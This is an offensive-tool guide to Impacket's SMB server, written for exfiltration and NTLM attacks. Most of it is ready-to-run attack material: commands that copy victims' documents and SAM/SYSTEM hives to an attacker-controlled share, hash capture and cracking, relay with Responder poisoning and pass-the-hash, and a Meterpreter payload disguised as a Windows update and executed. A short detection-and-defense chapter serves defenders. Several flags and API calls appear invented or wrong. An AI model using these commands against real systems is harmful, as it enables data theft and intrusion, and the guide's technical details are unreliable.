---
tool_name: "impacket-smbserver"
display_name: "Impacket SMBServer"
mitre_tactic: "exfiltration"
mitre_tactic_id: "TA0010"
mitre_technique: "T1021.002 - Remote Services: SMB/Windows Admin Shares"
mitre_technique_id: "T1021.002"
install_command: "sudo apt install python3-impacket"
version: "0.13.0"
github_repo: "https://github.com/SecureAuthCorp/impacket"
kali_tools_page: "https://www.kali.org/tools/impacket/"
difficulty_level: "intermediate"
requires_root: false
gui_available: false
tags: ["exfiltration", "smb", "ntlm", "relay", "hash-capture", "file-server", "windows", "python"]
related_tools: ["goshs", "raven", "responder", "ntlmrelayx", "smbclient"]
---

# Impacket SMBServer — SMB File Sharing and NTLM Relay for Exfiltration

## What This Tool Does (in 30 seconds)

Impacket's `impacket-smbserver` is a Python-based SMB server implementation that provides a fully functional SMB share for receiving files, capturing NTLM hashes, and performing NTLM relay attacks. It is the industry standard for SMB-based exfiltration during penetration tests. Unlike goshs, Impacket's SMB server supports the full SMB protocol stack including SMBv1/v2/v3, NTLM authentication capture, and can be chained with `ntlmrelayx` for relay attacks. It is part of the larger Impacket framework used universally in enterprise pentesting.

---

## Chapter 1: Introduction & Overview

### What is impacket-smbserver?

`impacket-smbserver` (also known as `smbserver.py` in the Impacket source) is a Python script that implements a fully featured SMB server. It is part of the Impacket library by SecureAuth (now Fortra), a collection of Python classes for working with network protocols. The SMB server can host shares, capture NTLM authentication hashes from connecting clients, and feed those hashes into relay attacks. For exfiltration, it provides the most reliable way to receive files from Windows targets over the native SMB protocol.

### Key Features

- Full SMBv1, SMBv2, and SMBv3 server implementation
- NTLM hash capture from authenticated connections
- Integration with ntlmrelayx for NTLM relay attacks
- Share-level and user-level access control
- Support for all SMB operations (read, write, delete, rename)
- Named pipe support for IPC$
- Raw SMB packet handling
- Works with Windows `net use`, PowerShell, and `copy` commands
- Part of the larger Impacket ecosystem (secretsdump, wmiexec, psexec, etc.)
- Python-based — easy to extend and customize
- No external dependencies beyond Impacket itself

### History & Background

- **Author:** SecureAuth Corporation (now Fortra)
- **Language:** Python 3
- **License:** Apache License 2.0
- **Repository:** github.com/SecureAuthCorp/impacket
- **Kali Package:** python3-impacket (version 0.13.0)
- **First Released:** 2007 (Impacket library)
- **Purpose:** Network protocol library for pentesting, forensics, and reverse engineering

### When to Use impacket-smbserver

- **Data exfiltration** — Receive files from Windows targets over SMB
- **NTLM hash capture** — Collect hashes from misconfigured hosts
- **NTLM relay attacks** — Relay captured hashes to other services
- **Credential testing** — Validate captured NTLM hashes
- **Red team operations** — Host convincing SMB infrastructure
- **Pentest engagements** — Standard tool for SMB-based data theft
- **Forensic analysis** — Parse and replay SMB traffic

### When NOT to Use This Tool

- Without written authorization — SMB server deployment on networks is highly visible
- When stealth is paramount — Impacket SMB traffic has known fingerprints
- For simple file transfers — `python3 -m http.server` or `goshs` are simpler
- When SMBv3 encryption is required and the target enforces it
- For large-scale exfiltration — Consider DNS or HTTPS channels instead

### Legal and Ethical Considerations

- Deploying SMB servers on networks requires explicit authorization
- NTLM hash capture should be reported and handled according to engagement rules
- Captured credentials must be securely stored and destroyed after engagement
- SMB traffic generates significant network noise — plan detection evasion if needed
- Relay attacks have specific legal implications in some jurisdictions

### Key Concepts

- **SMB (Server Message Block):** Microsoft protocol for file sharing, printing, and IPC
- **NTLM (NT LAN Manager):** Microsoft authentication protocol using challenge-response
- **NTLM Relay:** Capturing an NTLM authentication and replaying it to another service
- **NTLMv2:** The current NTLM authentication version; hashes can be cracked offline
- **SAM (Security Account Manager):** Windows database of user password hashes
- **Named Pipes:** IPC mechanism used by SMB for inter-process communication
- **IPC$:** Hidden share used for named pipe communication
- **ADMIN$:** Hidden share for remote administration
- **C$:** Default administrative share for the C: drive

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Any Linux distribution with Python 3
- **Python:** 3.7 or higher
- **RAM:** 100 MB minimum
- **Disk Space:** 15 MB (Impacket library)
- **Privileges:** Root needed only for ports below 1024 (SMB on 445 requires root)
- **Dependencies:** python3-pycryptodome, python3-openssl, python3-flask, python3-pyasn1

### Installation Methods

#### Method 1: APT (Recommended)

```bash
sudo apt update
sudo apt install python3-impacket
```

Verify installation:

```bash
impacket-smbserver --help
# or
python3 -m impacket.smbserver --help
```

#### Method 2: From pip (Latest Version)

```bash
pip3 install impacket
```

#### Method 3: From Source (Development)

```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install -e .
```

### Verify Impacket Installation

```bash
# Check all available Impacket scripts
ls /usr/share/doc/python3-impacket/examples/

# Check Impacket version
python3 -c "import impacket; print(impacket.__version__)"
```

### Dependencies

Impacket depends on:

- `pycryptodome` — Cryptographic operations
- `pyOpenSSL` — TLS/SSL support
- `flask` — Web interface for some tools
- `ldap3` — LDAP protocol support
- `pyasn1` — ASN.1 encoding
- `charset-normalizer` — Character encoding detection
- `six` — Python 2/3 compatibility

Install all dependencies:

```bash
sudo apt install python3-pycryptodome python3-openssl python3-flask python3-ldap3 python3-pyasn1
```

---

## Chapter 3: Basic Usage

### impacket-smbserver Command Reference

#### Core Syntax

```bash
impacket-smbserver <share_name> <share_path> [options]
```

#### Positional Arguments

| Argument | Description | Example |
|----------|-------------|---------|
| `share_name` | Name of the SMB share | `loot`, `public`, `data` |
| `share_path` | Local directory to share | `/tmp/exfil`, `.` |

#### Authentication Options

| Flag | Description | Example |
|------|-------------|---------|
| `-smb2support` | Enable SMBv2/v3 support | `-smb2support` |
| `-comment` | Share comment | `-comment "Exfil Share"` |
| `-user` | Require username for access | `-user admin` |
| `-password` | Require password for access | `-password secret` |
| `-hashes` | NTLM hashes for auth (LM:NT) | `-hashes aad3b...:8846...` |
| `-ts` | Add timestamps to output | `-ts` |
| `-debug` | Enable debug output | `-debug` |

#### NTLM Capture Options

| Flag | Description | Example |
|------|-------------|---------|
| `-outputfile` | Save captured hashes to file | `-outputfile hashes.txt` |

#### Relay Options (with ntlmrelayx)

| Flag | Description | Example |
|------|-------------|---------|
| `-relay` | Relay captured hashes | `-relay target_ip` |
| `-socks` | Use SOCKS proxy for relay | `-socks` |

### Scenario 1: Basic SMB Share for Exfiltration

```bash
# Share /tmp/exfil as SMB share named "loot"
impacket-smbserver loot /tmp/exfil -smb2support
```

Sample output:

```
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Configuring parsed share
[*] Share loot loaded
[*] Setting up SMB Server
[*] Server is running on 0.0.0.0:445
[*] Press Ctrl+C to stop
```

On the Windows target:

```cmd
net use L: \\KALI_IP\loot
copy C:\Users\victim\passwords.xlsx L:\
net use L: /delete
```

### Scenario 2: Authenticated SMB Share

```bash
# Require username and password
impacket-smbserver loot /tmp/exfil -smb2support -user analyst -password Str0ngP@ss!
```

On the Windows target:

```cmd
net use L: \\KALI_IP\loot /user:analyst Str0ngP@ss!
copy C:\data\secret.docx L:\
net use L: /delete
```

### Scenario 3: NTLM Hash Capture

```bash
# Capture NTLM hashes from connecting clients
impacket-smbserver loot /tmp/exfil -smb2support -outputfile /tmp/captured_hashes.txt
```

When a client connects:

```
[*] Client connected: 10.10.10.100
[*] NTLMv2-SSP Hash: victim::WORKGROUP:1122334455667788:AA...FF:0101000000000000...
[*] Hash saved to /tmp/captured_hashes.txt
```

Crack the hash:

```bash
hashcat -m 5600 /tmp/captured_hashes.txt /usr/share/wordlists/rockyou.txt
# or
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/captured_hashes.txt
```

### Scenario 4: NTLM Relay with ntlmrelayx

```bash
# Terminal 1: Start SMB server that relays to target
impacket-ntlmrelayx -t 10.10.10.200 -smb2support -socks

# Terminal 2: Start SMB server to trigger authentication
impacket-smbserver loot /tmp/exfil -smb2support

# When a client connects, the hash is relayed to the target
```

### Scenario 5: Share with Specific User Permissions

```bash
# Create share with multiple users
impacket-smbserver loot /tmp/exfil -smb2support -user admin -password admin123
```

For more complex setups, use the Python API:

```python
from impacket.smbserver import SMBServer, SimpleSMBServer

server = SimpleSMBServer(listenAddress='0.0.0.0', listenPort=445)
server.addShare('loot', '/tmp/exfil', comment='Exfiltration Share')
server.setSMB2Support(True)
server.start()
```

---

## Chapter 4: Intermediate Usage & Automation

### Scripting Exfiltration Workflows

#### Automated NTLM Capture and Cracking

```bash
#!/bin/bash
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
HASH_FILE="/tmp/hashes_${TIMESTAMP}.txt"
EXFIL_DIR="/tmp/exfil_${TIMESTAMP}"

mkdir -p "$EXFIL_DIR"

echo "[*] Starting Impacket SMB server with NTLM capture..."
echo "[*] Hash file: $HASH_FILE"

# Start SMB server with hash capture
impacket-smbserver \
  loot "$EXFIL_DIR" \
  -smb2support \
  -outputfile "$HASH_FILE" \
  -ts \
  -debug &

SERVER_PID=$!
echo "[*] SMB Server PID: $SERVER_PID"
echo "[*] Share: \\\\KALI_IP\\loot"
echo "[*] Waiting for connections..."

# Monitor for captured hashes
tail -f "$HASH_FILE" | while read line; do
    if [[ "$line" == *"NTLMv2"* ]]; then
        echo "[!] Hash captured! Attempting to crack..."
        hashcat -m 5600 "$HASH_FILE" /usr/share/wordlists/rockyou.txt --force 2>/dev/null
    fi
done &
MONITOR_PID=$!

# Cleanup
cleanup() {
    kill $SERVER_PID $MONITOR_PID 2>/dev/null
    echo "[*] Server stopped."
    echo "[*] Captured hashes: $HASH_FILE"
    echo "[*] Exfiltrated files: $EXFIL_DIR"
    ls -la "$EXFIL_DIR"
}
trap cleanup EXIT
wait
```

#### Multi-Share SMB Server

```python
#!/usr/bin/env python3
from impacket.smbserver import SimpleSMBServer

def main():
    server = SimpleSMBServer(listenAddress='0.0.0.0', listenPort=445)
    server.setSMB2Support(True)

    # Add multiple shares
    server.addShare('public', '/tmp/public', comment='Public Share')
    server.addShare('confidential', '/tmp/confidential', comment='Confidential')
    server.addShare('loot', '/tmp/loot', comment='Exfil Loot')

    # Enable authentication requirement
    server.addCredential('admin', '1001', 'aad3b435b51404eeaad3b435b51404ee',
                         '8846f7eaee8fb117ad06bdd830b7586c')
    server.addCredential('analyst', '1002', 'aad3b435b51404eeaad3b435b51404ee',
                         '57837346578373465783734657837346')

    print("[*] Starting multi-share SMB server...")
    print("[*] Shares: public, confidential, loot")
    server.start()

if __name__ == '__main__':
    main()
```

#### Exfiltration with Logging and Cleanup

```bash
#!/bin/bash
EXFIL_DIR="/tmp/exfil"
LOG_FILE="/var/log/smb_exfil.log"
HASH_FILE="/tmp/ntlm_hashes.txt"

# Create exfil directory
mkdir -p "$EXFIL_DIR"

# Start SMB server with logging
impacket-smbserver \
  loot "$EXFIL_DIR" \
  -smb2support \
  -outputfile "$HASH_FILE" \
  -ts \
  2>&1 | tee "$LOG_FILE" &

SERVER_PID=$!

# Function to process exfiltrated files
process_files() {
    while true; do
        find "$EXFIL_DIR" -type f -newer /tmp/.last_check 2>/dev/null | while read file; do
            echo "[$(date)] Received: $file ($(stat -c%s "$file") bytes)" >> "$LOG_FILE"
            # Calculate hash for integrity
            sha256sum "$file" >> "${LOG_FILE}.sha256"
        done
        touch /tmp/.last_check
        sleep 5
    done
}

process_files &
MONITOR_PID=$!

echo "[*] SMB Server PID: $SERVER_PID"
echo "[*] Monitor PID: $MONITOR_PID"
echo "[*] Share: \\\\KALI_IP\\loot"

wait $SERVER_PID
```

### Integration with Other Impacket Tools

#### Chain with secretsdump

```bash
# Step 1: Capture NTLM hash via SMB server
impacket-smbserver loot /tmp/exfil -smb2support -outputfile /tmp/hashes.txt

# Step 2: Use captured hash with secretsdump
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrator@10.10.10.100
```

#### Chain with wmiexec

```bash
# Step 1: Capture hash
impacket-smbserver loot /tmp/exfil -smb2support -outputfile /tmp/hashes.txt

# Step 2: Use hash to execute commands
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrator@10.10.10.100
```

#### Chain with psexec

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrator@10.10.10.100
```

---

## Chapter 5: Advanced Usage

### Custom SMB Server Configuration

#### Python-Based Advanced Server

```python
#!/usr/bin/env python3
"""
Advanced Impacket SMB Server with logging, access control, and hash capture.
"""
import os
import logging
from impacket.smbserver import SimpleSMBServer

# Configure logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger('SMBServer')

class ExfilSMBServer:
    def __init__(self, listen_addr='0.0.0.0', listen_port=445):
        self.server = SimpleSMBServer(
            listenAddress=listen_addr,
            listenPort=listen_port
        )
        self.server.setSMB2Support(True)
        self.exfil_dir = '/tmp/exfil'
        os.makedirs(self.exfil_dir, exist_ok=True)

    def add_share(self, name, path, comment=''):
        """Add a share to the server."""
        self.server.addShare(name, path, comment=comment)
        logger.info(f"Share added: {name} -> {path}")

    def add_user(self, username, uid, lmhash, nthash):
        """Add a user credential."""
        self.server.addCredential(username, uid, lmhash, nthash)
        logger.info(f"User added: {username} (UID: {uid})")

    def enable_relay(self, target, port=445):
        """Enable NTLM relay to target."""
        self.server.setrelayTarget(target, port)
        logger.info(f"Relay enabled: {target}:{port}")

    def start(self):
        """Start the server."""
        logger.info("Starting SMB server...")
        self.server.start()

def main():
    server = ExfilSMBServer('0.0.0.0', 445)

    # Add shares
    server.add_share('loot', '/tmp/loot', 'Exfiltration Share')
    server.add_share('public', '/tmp/public', 'Public Files')

    # Add users (LM:NT hashes)
    server.add_user('admin', 1001,
                    'aad3b435b51404eeaad3b435b51404ee',
                    '8846f7eaee8fb117ad06bdd830b7586c')
    server.add_user('analyst', 1002,
                    'aad3b435b51404eeaad3b435b51404ee',
                    '57837346578373465783734657837346')

    server.start()

if __name__ == '__main__':
    main()
```

### Named Pipe Support

Impacket SMB server can host named pipes for advanced operations:

```python
from impacket.smbserver import SimpleSMBServer
from impacket.smb import SMB_Dialect

class CustomPipeServer:
    def __init__(self):
        self.server = SimpleSMBServer(listenAddress='0.0.0.0', listenPort=445)
        self.server.setSMB2Support(True)

        # Add a share
        self.server.addShare('loot', '/tmp/exfil', comment='Exfil')

    def handle_pipe_data(self, data):
        """Process data received via named pipe."""
        print(f"[*] Pipe data received: {len(data)} bytes")
        with open('/tmp/piped_data.bin', 'ab') as f:
            f.write(data)
        return b'OK'

    def start(self):
        self.server.start()

if __name__ == '__main__':
    server = CustomPipeServer()
    server.start()
```

### Covert SMB Exfiltration

#### Over Non-Standard Port

```bash
# Run SMB on port 8445 (non-standard)
impacket-smbserver loot /tmp/exfil -smb2support -port 8445

# On Windows target
net use L: \\KALI_IP@8445\loot
```

#### Over IPv6

```bash
# Bind to IPv6
impacket-smbserver loot /tmp/exfil -smb2support -ipv6
```

#### With Encryption (via stunnel)

```bash
# Terminal 1: Start Impacket SMB on localhost
impacket-smbserver loot /tmp/exfil -smb2support -listen 127.0.0.1

# Terminal 2: Wrap with stunnel for TLS encryption
stunnel -d 443 -l 127.0.0.1:445 -r 127.0.0.1:445 -p /tmp/stunnel.pem
```

---

## Chapter 6: Real-World Scenarios

### Scenario 1: Penetration Test -- Domain-Wide Exfiltration

**Objective:** Extract sensitive data from multiple Windows machines in a domain.

**Setup:**

```bash
# Start SMB server with logging
impacket-smbserver exfil /tmp/loot -smb2support -outputfile /tmp/domain_hashes.txt -ts
```

**Execution on each compromised host:**

```cmd
:: Map the share
net use L: \\10.10.14.5\exfil /user:CORP\admin Password123

:: Copy sensitive files
copy C:\Users\victim\Documents\*.docx L:\
copy C:\Users\victim\Desktop\*.xlsx L:\
xcopy /s /e C:\inetpub\wwwroot\app\web.config L:\web_config\

:: Disconnect
net use L: /delete
```

**Post-exfiltration:**

```bash
# Verify files
ls -la /tmp/loot/
find /tmp/loot -type f -exec file {} \;

# Crack captured hashes
hashcat -m 5600 /tmp/domain_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Scenario 2: Incident Response -- Forensic Artifact Collection

**Objective:** Collect forensic artifacts from compromised servers during IR.

**Setup:**

```bash
# Start SMB server with specific user access
impacket-smbserver ir_collect /tmp/ir_evidence -smb2support \
  -user ir_team -password IncidentResponse2024!
```

**On each compromised server (via existing access):**

```powershell
# PowerShell: Collect and upload artifacts
$cred = Get-Credential
New-PSDrive -Name L -PSProvider FileSystem -Root "\\10.10.14.5\ir_collect" -Credential $cred

# Collect artifacts
Copy-Item "C:\Windows\System32\winevt\Logs\Security.evtx" -Destination "L:\"
Copy-Item "C:\Windows\System32\winevt\Logs\System.evtx" -Destination "L:\"
Copy-Item "C:\Windows\System32\config\SAM" -Destination "L:\"
Copy-Item "C:\Windows\System32\config\SYSTEM" -Destination "L:\"
Copy-Item "C:\Windows\System32\config\SECURITY" -Destination "L:\"

Remove-PSDrive -Name L
```

### Scenario 3: Red Team -- NTLM Relay to Domain Controller

**Objective:** Relay captured NTLM hashes to a domain controller for privilege escalation.

**Setup:**

```bash
# Terminal 1: Start ntlmrelayx for relay attack
impacket-ntlmrelayx -t 10.10.10.1 -smb2support -socks

# Terminal 2: Start SMB server to trigger authentication
impacket-smbserver loot /tmp/exfil -smb2support

# Terminal 3: Poison network to trigger authentication (using Responder)
sudo responder -I eth0 -wrf
```

**When a victim connects:**

```
[*] SMBD-Thread-5: Received connection from 10.10.10.100
[*] Authenticating against 10.10.10.1 as CORP/admin
[*] SOCKS proxy established: 10.10.10.100:445 -> 10.10.10.1:445
[*] Session established, use socks proxy with impacket tools
```

**Then access the target through the relay:**

```bash
# Use the SOCKS proxy to access the relayed session
export PROXYSOCKS=socks4://127.0.0.1 1080

# Access via psexec through the relay
impacket-psexec CORP/admin@10.10.10.1 -hashes :8846f7eaee8fb117ad06bdd830b7586c
```

### Scenario 4: Lab Environment -- SMB Share for Payload Delivery

**Objective:** Host malicious payloads via SMB for initial access testing.

```bash
# Create payload directory
mkdir -p /tmp/payloads
cp /usr/share/metasploit-framework/data/windows/meterpreter/reverse_tcp.exe /tmp/payloads/

# Start SMB server
impacket-smbserver payloads /tmp/payloads -smb2support -comment "Windows Updates"

# On target (via command injection or other access)
copy \\KALI_IP\payloads\reverse_tcp.exe C:\Windows\Temp\update.exe
C:\Windows\Temp\update.exe
```

### Scenario 5: Advanced -- Custom SMB Server with File Logging

```python
#!/usr/bin/env python3
"""
Custom SMB server that logs all file operations and stores received files.
"""
import os
import json
from datetime import datetime
from impacket.smbserver import SimpleSMBServer

class LoggingSMBServer:
    def __init__(self):
        self.log_file = '/var/log/smb_exfil.json'
        self.exfil_dir = '/tmp/exfil'
        os.makedirs(self.exfil_dir, exist_ok=True)

    def log_event(self, event_type, details):
        """Log an event to the JSON log file."""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'event': event_type,
            **details
        }
        with open(self.log_file, 'a') as f:
            f.write(json.dumps(entry) + '\n')
        print(f"[{entry['timestamp']}] {event_type}: {details}")

    def start(self):
        """Start the logging SMB server."""
        server = SimpleSMBServer(listenAddress='0.0.0.0', listenPort=445)
        server.setSMB2Support(True)
        server.addShare('loot', self.exfil_dir, comment='Exfiltration')

        self.log_event('server_start', {
            'shares': ['loot'],
            'directory': self.exfil_dir
        })

        server.start()

if __name__ == '__main__':
    srv = LoggingSMBServer()
    srv.start()
```

---

## Chapter 7: Detection & Defense

### Detection Signatures

#### Snort/Suricata Rules

```
# Detect Impacket SMB server fingerprint
alert tcp any any -> $HOME_NET 445 (
    msg:"Impacket SMB Server Detected";
    flow:to_server,established;
    content:"|FE|SMB";
    depth:4;
    content:"Workstation";
    sid:1000010;
    rev:1;
)

# Detect NTLM relay activity
alert tcp any any -> $HOME_NET 445 (
    msg:"Potential NTLM Relay Activity";
    flow:to_server,established;
    content:"|FE|SMB";
    content:"NTLMSSP";
    sid:1000011;
    rev:1;
)

# Detect SMB on non-standard ports
alert tcp any any -> $HOME_NET 8445 (
    msg:"SMB on Non-Standard Port Detected";
    flow:to_server,established;
    content:"|FE|SMB";
    sid:1000012;
    rev:1;
)
```

#### YARA Rules

```
rule impacket_smb_server {
    meta:
        description = "Detects Impacket SMB server traffic"
        author = "Security Team"
        date = "2024-01-01"
    strings:
        $impacket1 = "Impacket" ascii
        $impacket2 = "SMB" ascii
        $impacket3 = "WORKGROUP" ascii
        $impacket4 = "SecurityAccountManager" ascii
    condition:
        $impacket1 or ($impacket2 and $impacket3)
}

rule ntlm_relay_indicator {
    meta:
        description = "Indicates NTLM relay activity"
    strings:
        $ntlm1 = "NTLMSSP" ascii
        $ntlm2 = "NTLMv2" ascii
    condition:
        $ntlm1 and $ntlm2
}
```

### Log Analysis

```bash
# Monitor Impacket logs
tail -f /var/log/syslog | grep -i impacket

# Check for SMB connections
netstat -an | grep 445

# Monitor captured hashes
watch -n 5 'wc -l /tmp/captured_hashes.txt'

# Detect unusual SMB shares
smbclient -L //localhost -N 2>/dev/null
```

### Defensive Measures

1. **Disable NTLM authentication** — Use Kerberos instead where possible
2. **Enable SMB signing** — Prevents NTLM relay attacks
3. **Enable SMB encryption** — SMBv3 encryption protects against interception
4. **Network segmentation** — Block SMB ports between user segments
5. **Monitor NTLM usage** — Alert on NTLM authentication events
6. **Deploy LAPS** — Local Administrator Password Solution prevents shared admin passwords
7. **Credential Guard** — Protects NTLM hashes in Windows
8. **Audit SMB shares** — Regularly check for unauthorized shares

---

## Chapter 8: Troubleshooting

### Common Issues and Solutions

#### Port 445 Already in Use

```bash
# Error: [Errno 98] Address already in use
sudo lsof -i :445
sudo kill <PID>

# Or use a different port
impacket-smbserver loot /tmp/exfil -smb2support -port 4445
```

#### SMBv2 Connection Fails

```bash
# Ensure SMBv2 support is enabled
impacket-smbserver loot /tmp/exfil -smb2support

# Check Windows SMB version
# On Windows: Get-SmbConnection
```

#### Permission Denied on Share

```bash
# Ensure the share directory exists and is writable
mkdir -p /tmp/exfil
chmod 777 /tmp/exfil

# Check file permissions
ls -la /tmp/exfil/
```

#### NTLM Hash Not Captured

```bash
# Ensure the client is connecting with NTLM
# On Windows: check group policy for "Network security: LAN Manager authentication level"
# Set to "Send NTLMv2 response only"

# Verify with Wireshark
wireshark -f "tcp.port == 445" -Y "ntlmssp"
```

#### Python Module Not Found

```bash
# Reinstall Impacket
sudo apt reinstall python3-impacket

# Or install from pip
pip3 install impacket --force-reinstall
```

#### SMB Server Slow Performance

```bash
# Disable debug output
impacket-smbserver loot /tmp/exfil -smb2support

# Use a faster disk
impacket-smbserver loot /tmp/exfil -smb2support  # /tmp is tmpfs (RAM)
```

### Debugging

```bash
# Enable verbose debug output
impacket-smbserver loot /tmp/exfil -smb2support -debug -ts

# Capture SMB traffic
sudo tcpdump -i any port 445 -w /tmp/smb_capture.pcap

# Analyze with Wireshark
wireshark /tmp/smb_capture.pcap

# Test SMB connectivity from Linux
smbclient -L //localhost -N
smbclient //localhost/loot -N -c "ls"
```

---

## Resources

### Official Documentation

- **Impacket GitHub:** https://github.com/SecureAuthCorp/impacket
- **Impacket Wiki:** https://github.com/SecureAuthCorp/impacket/wiki
- **Kali Tools Page:** https://www.kali.org/tools/impacket/
- **Impacket Documentation:** https://impacket.readthedocs.io/

### Related MITRE ATT&CK Techniques

- **T1021.002** -- Remote Services: SMB/Windows Admin Shares
- **T1557** -- Adversary-in-the-Middle: NTLM Relay
- **T1003.001** -- OS Credential Dumping: SAM
- **T1550.002** -- Use Alternate Authentication Material: Pass the Hash
- **T1218** -- System Binary Proxy Execution

### Related Tools

- **goshs** — Go-based multi-protocol file server with SMB support
- **raven** — HTTP file upload server
- **Responder** — LLMNR/NBT-NS/MDNS poisoner for credential capture
- **ntlmrelayx** — NTLM relay tool (part of Impacket)
- **secretsdump** — Credential dumping tool (part of Impacket)
- **smbclient** — SMB client for connecting to shares

### Books and References

- "Mastering Windows Security and Pentesting" by Packt Publishing
- "Active Directory Security" by William Glenn
- "The Hacker Playbook 3" -- Practical penetration testing techniques
- MITRE ATT&CK Framework: https://attack.mitre.org/
- Microsoft SMB Protocol Documentation: https://docs.microsoft.com/en-us/windows/win32/fileio/smb-portal

---

*Last updated: 2026-07-20*
*Impacket version: 0.13.0*
*Kali Linux version: 2026.x*
